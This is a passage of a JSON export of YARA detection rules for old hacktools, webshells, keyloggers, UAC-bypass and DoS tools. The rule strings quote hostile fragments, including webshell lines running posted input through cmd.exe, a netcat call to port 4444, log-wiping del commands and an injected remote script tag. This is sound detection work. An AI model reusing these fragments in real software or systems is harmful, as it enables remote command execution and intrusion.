\n      all of them\n}","date":"2014-11-23 13:04:51","description":"Disclosed hacktool set (old stuff) - file asp4.txt","minimum_yara":"1.7","name":"Webshell_aspbackdoor_asp4_RID3106","reference":"-","required_modules":[],"rule_hash":"23a607db76341d347fe86f93f0987878","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspfile1_RID2DBB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file aspfile1.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:44:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"' -- check for a command that we have posted -- '\" fullword ascii\n      $s1 = \"szTempFile = \\\"C:\\\\\\\" & oFileSys.GetTempName( )\" fullword ascii\n      $s5 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"><BODY>\" fullword ascii\n      $s6 = \"<input type=text name=\\\".CMD\\\" size=45 value=\\\"<%= szCMD %>\\\">\" fullword ascii\n      $s8 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword ascii\n      $s15 = \"szCMD = Request.Form(\\\".CMD\\\")\" fullword ascii\n   condition: \n      3 of them\n}","date":"2014-11-23 10:44:21","description":"Disclosed hacktool set (old stuff) - file aspfile1.asp","minimum_yara":"1.7","name":"Webshell_aspfile1_RID2DBB","reference":"-","required_modules":[],"rule_hash":"bf97ea456d979e265b3949f85606d535","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspbackdoor_regdll_RID3208 : DEMO T1100 T1117 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:47:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, T1117, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n      $s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n      $s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n      $s5 = \"Public Property Get oFS()\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 13:47:51","description":"Disclosed hacktool set (old stuff) - file regdll.asp","minimum_yara":"1.7","name":"Webshell_aspbackdoor_regdll_RID3208","reference":"-","required_modules":[],"rule_hash":"70e00ffb48bcfad69212f6c3df5694ab","score":60,"tags":["T1100","DEMO","WEBSHELL","T1117"]},{"author":"Florian Roth","content":"rule XYZCmd_zip_Folder_Readme_RID304A : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file Readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 12:33:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"3.xyzcmd \\\\\\\\RemoteIP /user:Administrator /pwd:1234 /nowait trojan.exe\" fullword ascii\n      $s20 = \"XYZCmd V1.0\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 12:33:31","description":"Disclosed hacktool set (old stuff) - file Readme.txt","minimum_yara":"1.7","name":"XYZCmd_zip_Folder_Readme_RID304A","reference":"-","required_modules":[],"rule_hash":"db0bca050550d48a9ee9638e2bfdd275","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Webshell_aspbackdoor_asp3_RID3105 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp3.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:04:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form action=\\\"changepwd.asp\\\" method=\\\"post\\\"> \" fullword ascii\n      $s1 = \"  Set oUser = GetObject(\\\"WinNT://ComputerName/\\\" & UserName) \" fullword ascii\n      $s2 = \"    value=\\\"<%=Request.ServerVariables(\\\"LOGIN_USER\\\")%>\\\"> \" fullword ascii\n      $s14 = \" Windows NT \" fullword ascii\n      $s16 = \" WIndows 2000 \" fullword ascii\n      $s18 = \"OldPwd = Request.Form(\\\"OldPwd\\\") \" fullword ascii\n      $s19 = \"NewPwd2 = Request.Form(\\\"NewPwd2\\\") \" fullword ascii\n      $s20 = \"NewPwd1 = Request.Form(\\\"NewPwd1\\\") \" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 13:04:41","description":"Disclosed hacktool set (old stuff) - file asp3.txt","minimum_yara":"1.7","name":"Webshell_aspbackdoor_asp3_RID3105","reference":"-","required_modules":[],"rule_hash":"f30e3eb63a1c756b122fa86f13667152","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_aspbackdoor_asp1_RID3103 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 13:04:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"param = \\\"driver={Microsoft Access Driver (*.mdb)}\\\" \" fullword ascii\n      $s1 = \"conn.Open param & \\\";dbq=\\\" & Server.MapPath(\\\"scjh.mdb\\\") \" fullword ascii\n      $s6 = \"set rs=conn.execute (sql)%> \" fullword ascii\n      $s7 = \"<%set Conn = Server.CreateObject(\\\"ADODB.Connection\\\") \" fullword ascii\n      $s10 = \"<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh \" fullword ascii\n      $s15 = \"sql=\\\"select * from scjh\\\" \" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 13:04:21","description":"Disclosed hacktool set (old stuff) - file asp1.txt","minimum_yara":"1.7","name":"Webshell_aspbackdoor_asp1_RID3103","reference":"-","required_modules":[],"rule_hash":"b96dac044f14fee89fbcdedce27c31df","score":60,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule PassSniffer_zip_Folder_readme_RID32AF : DEMO SUSP T1040 {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file readme.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 14:15:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1040\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PassSniffer.exe\" fullword ascii\n      $s1 = \"POP3/FTP Sniffer\" fullword ascii\n      $s2 = \"Password Sniffer V1.0\" fullword ascii\n   condition: \n      1 of them\n}","date":"2014-11-23 14:15:41","description":"Disclosed hacktool set (old stuff) - file readme.txt","minimum_yara":"1.7","name":"PassSniffer_zip_Folder_readme_RID32AF","reference":"-","required_modules":[],"rule_hash":"43439c6ec6d0fa7211258bd0173288b0","score":60,"tags":["SUSP","DEMO","T1040"]},{"author":"Florian Roth","content":"rule HKTL_BypassUacDll_6_RID2DDF : DEMO HKTL SUSP T1088 {\n   meta:\n      description = \"Semiautomatic generated rule - file BypassUacDll.aps\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:50:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SUSP, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"BypassUacDLL.dll\" fullword wide\n      $s4 = \"AFX_IDP_COMMAND_FAILURE\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 10:50:21","description":"Semiautomatic generated rule - file BypassUacDll.aps","minimum_yara":"1.7","name":"HKTL_BypassUacDll_6_RID2DDF","reference":"-","required_modules":[],"rule_hash":"b37846ddcd5757a2964f221e73e78eea","score":75,"tags":["SUSP","DEMO","T1088","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_BypassUac_EXE_RID2D6F : DEMO HKTL SUSP T1088 {\n   meta:\n      description = \"Semiautomatic generated rule - file BypassUacDll.aps\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, SUSP, T1088\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wole32.dll\" wide\n      $s3 = \"System32\\\\migwiz\" wide\n      $s4 = \"System32\\\\migwiz\\\\CRYPTBASE.dll\" wide\n      $s5 = \"Elevation:Administrator!new:\" wide\n      $s6 = \"BypassUac\" wide\n   condition: \n      all of them\n}","date":"2014-11-23 10:31:41","description":"Semiautomatic generated rule - file BypassUacDll.aps","minimum_yara":"1.7","name":"HKTL_BypassUac_EXE_RID2D6F","reference":"-","required_modules":[],"rule_hash":"f12d02db4924c1e3eb66ec4638e25e2d","score":75,"tags":["SUSP","DEMO","T1088","HKTL"]},{"author":"Florian Roth","content":"rule Jc_WinEggDrop_Shell_RID2E4A : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:08:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Sniffer.dll\" fullword ascii\n      $s4 = \":Execute net.exe user Administrator pass\" fullword ascii\n      $s5 = \"Fport.exe or mport.exe \" fullword ascii\n      $s6 = \":Password Sniffering Is Running |Not Running \" fullword ascii\n      $s9 = \": The Terminal Service Port Has Been Set To NewPort\" fullword ascii\n      $s15 = \": Del www.exe                   \" fullword ascii\n      $s20 = \":Dir *.exe                    \" fullword ascii\n   condition: \n      2 of them\n}","date":"2014-11-23 11:08:11","description":"Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt","minimum_yara":"1.7","name":"Jc_WinEggDrop_Shell_RID2E4A","reference":"-","required_modules":[],"rule_hash":"a759fcb1522707e516395d8faff1e84c","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule EditKeyLogReadMe_RID2D10 : DEMO SUSP T1056 {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file EditKeyLogReadMe_RID2D10.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 10:15:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"editKeyLog.exe KeyLog.exe,\" fullword ascii\n      $s1 = \"WinEggDrop.DLL\" fullword ascii\n      $s2 = \"nc.exe\" fullword ascii\n      $s3 = \"KeyLog.exe\" fullword ascii\n      $s4 = \"EditKeyLog.exe\" fullword ascii\n      $s5 = \"wineggdrop\" fullword ascii\n   condition: \n      3 of them\n}","date":"2014-11-23 10:15:51","description":"Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt","minimum_yara":"1.7","name":"EditKeyLogReadMe_RID2D10","reference":"-","required_modules":[],"rule_hash":"724df4898eca7886c1988c434674c3ec","score":60,"tags":["SUSP","DEMO","T1056"]},{"author":"Florian Roth","content":"rule aspbackdoor_ipclear_RID2ED9 : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set (old stuff) - file ipclear.vbs\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-23 11:32:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Set ServiceObj = GetObject(\\\"WinNT://\\\" & objNet.ComputerName & \\\"/w3svc\\\")\" fullword ascii\n      $s1 = \"wscript.Echo \\\"USAGE:KillLog.vbs LogFileName YourIP.\\\"\" fullword ascii\n      $s2 = \"Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)\" fullword ascii\n      $s3 = \"Set objNet = WScript.CreateObject( \\\"WScript.Network\\\" )\" fullword ascii\n      $s4 = \"Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-23 11:32:01","description":"Disclosed hacktool set (old stuff) - file ipclear.vbs","minimum_yara":"1.7","name":"aspbackdoor_ipclear_RID2ED9","reference":"-","required_modules":[],"rule_hash":"6a7bd79646b46a0590e83b60f18bb0c0","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Burst_Blast_RID306D : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Blast.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:39:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:\" ascii\n      $s1 = \"@echo off\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-17 12:39:21","description":"Disclosed hacktool set - file Blast.bat","minimum_yara":"1.7","name":"Hacktools_CN_Burst_Blast_RID306D","reference":"-","required_modules":[],"rule_hash":"a0f3f5373501db261a16e37614900070","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_445_cmd_RID2E38 : DEMO FILE SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file cmd.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:05:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $bat = \"@echo off\" fullword ascii\n      $s0 = \"cs.exe %1\" fullword ascii\n      $s2 = \"nc %1 4444\" fullword ascii\n   condition: \n      uint32 ( 0 ) == 0x68636540 and $bat at 0 and all of ( $s* )\n}","date":"2014-11-17 11:05:11","description":"Disclosed hacktool set - file cmd.bat","minimum_yara":"1.7","name":"Hacktools_CN_445_cmd_RID2E38","reference":"-","required_modules":[],"rule_hash":"76ecaec2e7d5176644cca8e7f646958f","score":60,"tags":["SUSP","DEMO","FILE"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Burst_pass_RID302E : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file pass.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:28:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"123456.com\" fullword ascii\n      $s1 = \"123123.com\" fullword ascii\n      $s2 = \"360.com\" fullword ascii\n      $s3 = \"123.com\" fullword ascii\n      $s4 = \"juso.com\" fullword ascii\n      $s5 = \"sina.com\" fullword ascii\n      $s7 = \"changeme\" fullword ascii\n      $s8 = \"master\" fullword ascii\n      $s9 = \"google.com\" fullword ascii\n      $s10 = \"chinanet\" fullword ascii\n      $s12 = \"lionking\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-17 12:28:51","description":"Disclosed hacktool set - file pass.txt","minimum_yara":"1.7","name":"Hacktools_CN_Burst_pass_RID302E","reference":"-","required_modules":[],"rule_hash":"3f8d389905d458d1561199db8a3c47f8","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Scan_BAT_RID2EC3 : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file scan.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:28:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n      $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n      $s2 = \"del host.txt /q\" fullword ascii\n      $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s4 = \"start Http.exe %%a %http%\" fullword ascii\n      $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n   condition: \n      5 of them\n}","date":"2014-11-17 11:28:21","description":"Disclosed hacktool set - file scan.bat","minimum_yara":"1.7","name":"Hacktools_CN_Scan_BAT_RID2EC3","reference":"-","required_modules":[],"rule_hash":"229cf2ee3796b8550ce6d515bcc05379","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Tzddos_DDoS_Tool_CN_RID2E1F : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file tzddos\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 11:01:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f %%a in (host.txt) do (\" fullword ascii\n      $s1 = \"for /f \\\"eol=S tokens=1 delims= \\\" %%i in (s2.txt) do echo %%i>>host.txt\" fullword ascii\n      $s2 = \"del host.txt /q\" fullword ascii\n      $s3 = \"for /f \\\"eol=- tokens=1 delims= \\\" %%i in (result.txt) do echo %%i>>s1.txt\" fullword ascii\n      $s4 = \"start Http.exe %%a %http%\" fullword ascii\n      $s5 = \"for /f \\\"eol=P tokens=1 delims= \\\" %%i in (s1.txt) do echo %%i>>s2.txt\" fullword ascii\n      $s6 = \"del Result.txt s2.txt s1.txt \" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-17 11:01:01","description":"Disclosed hacktool set - file tzddos","minimum_yara":"1.7","name":"Tzddos_DDoS_Tool_CN_RID2E1F","reference":"-","required_modules":[],"rule_hash":"0951f1d147e0d88ff5e5a130057de058","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Burst_Thecard_RID3132 : DEMO SUSP T1057 {\n   meta:\n      description = \"Disclosed hacktool set - file Thecard.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 13:12:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP, T1057\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"tasklist |find \\\"Clear.bat\\\"||start Clear.bat\" fullword ascii\n      $s1 = \"Http://www.coffeewl.com\" fullword ascii\n      $s2 = \"ping -n 2 localhost 1>nul 2>nul\" fullword ascii\n      $s3 = \"for /L %%a in (\" fullword ascii\n      $s4 = \"MODE con: COLS=42 lines=5\" fullword ascii\n   condition: \n      all of them\n}","date":"2014-11-17 13:12:11","description":"Disclosed hacktool set - file Thecard.bat","minimum_yara":"1.7","name":"Hacktools_CN_Burst_Thecard_RID3132","reference":"-","required_modules":[],"rule_hash":"9766cdea682cce09fad700844716291f","score":60,"tags":["SUSP","T1057","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Burst_Clear_RID305E : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Clear.bat\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:36:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"del /f /s /q %systemdrive%\\\\*.log    \" fullword ascii\n      $s1 = \"del /f /s /q %windir%\\\\*.bak    \" fullword ascii\n      $s4 = \"del /f /s /q %systemdrive%\\\\*.chk    \" fullword ascii\n      $s5 = \"del /f /s /q %systemdrive%\\\\*.tmp    \" fullword ascii\n      $s8 = \"del /f /q %userprofile%\\\\COOKIES s\\\\*.*    \" fullword ascii\n      $s9 = \"rd /s /q %windir%\\\\temp & md %windir%\\\\temp    \" fullword ascii\n      $s11 = \"del /f /s /q %systemdrive%\\\\recycled\\\\*.*    \" fullword ascii\n      $s12 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temp\\\\*.*\\\"    \" fullword ascii\n      $s19 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temporary Internet Files\\\\*.*\\\"   \" ascii\n   condition: \n      5 of them\n}","date":"2014-11-17 12:36:51","description":"Disclosed hacktool set - file Clear.bat","minimum_yara":"1.7","name":"Hacktools_CN_Burst_Clear_RID305E","reference":"-","required_modules":[],"rule_hash":"884a3f6e94f08dd236009b7923878df6","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Hacktools_CN_Burst_Start_RID3085 : DEMO SUSP {\n   meta:\n      description = \"Disclosed hacktool set - file Start.bat - DoS tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-11-17 12:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"for /f \\\"eol= tokens=1,2 delims= \\\" %%i in (ip.txt) do (\" fullword ascii\n      $s1 = \"Blast.bat /r 600\" fullword ascii\n      $s2 = \"Blast.bat /l Blast.bat\" fullword ascii\n      $s3 = \"Blast.bat /c 600\" fullword ascii\n      $s4 = \"start Clear.bat\" fullword ascii\n      $s5 = \"del Result.txt\" fullword ascii\n      $s6 = \"s syn %%i %%j 3306 /save\" fullword ascii\n      $s7 = \"start Thecard.bat\" fullword ascii\n      $s10 = \"setlocal enabledelayedexpansion\" fullword ascii\n   condition: \n      5 of them\n}","date":"2014-11-17 12:43:21","description":"Disclosed hacktool set - file Start.bat - DoS tool","minimum_yara":"1.7","name":"Hacktools_CN_Burst_Start_RID3085","reference":"-","required_modules":[],"rule_hash":"99da0cf9327036ccf2b660aaa3613657","score":60,"tags":["SUSP","DEMO"]},{"author":"Florian Roth","content":"rule Webshell_and_Exploit_CN_APT_HK_RID3243 : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell and Exploit Code in relation with APT against Honk Kong protesters\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 13:57:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a0 = \"<script language=javascript src=http://java-se.com/o.js</script>\" fullword\n      $s0 = \"<span style=\\\"font:11px Verdana;\\\">Password: </span><input name=\\\"password\\\" type=\\\"password\\\" size=\\\"20\\\">\" \n      $s1 = \"<input type=\\\"hidden\\\" name=\\\"doing\\\" value=\\\"login\\\">\" \n   condition: \n      $a0 or ( all of ( $s* ) )\n}","date":"2014-10-10 13:57:41","description":"Webshell and Exploit Code in relation with APT against Honk Kong protesters","minimum_yara":"1.7","name":"Webshell_and_Exploit_CN_APT_HK_RID3243","reference":"-","required_modules":[],"rule_hash":"aa24085f67cb0949939760ef0cc2a3d0","score":50,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule JSP_Browser_APT_webshell_RID303A : APT DEMO T1100 WEBSHELL {\n   meta:\n      description = \"VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 12:30:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1a = \"private static final String[] COMMAND_INTERPRETER = {\\\"\" ascii\n      $a1b = \"cmd\\\", \\\"/C\\\"}; // Dos,Windows\" ascii\n      $a2 = \"Process ls_proc = Runtime.getRuntime().exec(comm, null, new File(dir));\" ascii\n      $a3 = \"ret.append(\\\"!!!! Process has timed out, destroyed !!!!!\\\");\" ascii\n   condition: \n      all of them\n}","date":"2014-10-10 12:30:51","description":"VonLoesch JSP Browser used as web shell by APT groups - jsp File browser 1.1a","minimum_yara":"1.7","name":"JSP_Browser_APT_webshell_RID303A","reference":"-","required_modules":[],"rule_hash":"97c14840d47a91ac80bcb5dbd6f82dee","score":60,"tags":["T1100","DEMO","WEBSHELL","APT"]},{"author":"Florian Roth","content":"rule Powershell_Netcat_RID2DF4 : DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects a Powershell version of the Netcat network hacking tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-10-10 10:53:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[ValidateRange(1, 65535)]\" fullword\n      $s1 = \"$Client = New-Object -TypeName System.Net.Sockets.TcpClient\" fullword\n      $s2 = \"$Buffer = New-Object -TypeName System.Byte[] -ArgumentList $Client.ReceiveBufferSize\" fullword\n   condition: \n      all of them\n}","date":"2014-10-10 10:53:51","description":"Detects a Powershell version of the Netcat network hacking tool","minimum_yara":"1.7","name":"Powershell_Netcat_RID2DF4","reference":"-","required_modules":[],"rule_hash":"1bd48741d1e9a01f94eaebfd8d632e6a","score":60,"tags":["DEMO","T1064","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule MAL_DarkComet_Keylogger_File_RID31AB : APT DEMO FILE HKTL MAL T1056 {\n   meta:\n      description = \"Looks like a keylogger file created by DarkComet Malware\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-07-25 13:32:21\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, HKTL, MAL, T1056\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $entry = /\\n:: [A-Z]/ \n      $timestamp = /\\([0-9]?[0-9]:[0-9][0-9]:[0-9][0-9] [AP]M\\)/ \n   condition: \n      uint16 ( 0 ) == 0x3A3A and #entry > 10 and #timestamp > 10\n}","date":"2014-07-25 13:32:21","description":"Looks like a keylogger file created by DarkComet Malware","minimum_yara":"1.7","name":"MAL_DarkComet_Keylogger_File_RID31AB","reference":"-","required_modules":[],"rule_hash":"7640fab2e2ef3120789e53f3002b325b","score":50,"tags":["MAL","DEMO","T1056","FILE","APT","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_DllInjection_RID2D62 : DEMO HKTL T1055 T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file DllInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1055, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\BDoor\\\\DllInjecti\" \n   condition: \n      all of them\n}","date":"2014-04-07 10:29:31","description":"Webshells Auto-generated - file DllInjection.exe","minimum_yara":"1.7","name":"HKTL_DllInjection_RID2D62","reference":"-","required_modules":[],"rule_hash":"3784c3b2a24c82d2429640857ad8c03d","score":75,"tags":["T1100","DEMO","WEBSHELL","T1055","HKTL"]},{"author":"Florian Roth","content":"rule Simple_PHP_BackDooR_RID2E06 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Simple_PHP_BackDooR_RID2E06.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-07 10:56:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, 